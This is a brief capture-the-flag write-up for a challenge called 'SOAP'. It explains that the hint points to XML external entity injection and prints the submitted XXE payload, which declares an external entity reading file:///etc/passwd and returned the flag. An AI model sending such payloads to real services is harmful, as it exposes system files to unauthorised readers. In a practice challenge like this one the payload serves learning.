# SOAP
- Open the given webpage, and look at the hint (I think it practically gives away the problem tbh)
- From the hint, we need to use: [XXE](https://portswigger.net/web-security/xxe)
- Luckily, the provided link has the payload given for the this chall, so we can just submit it to get the flag
- I submitted: 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>&xxe;</ID></data>
```, which then gave me the flag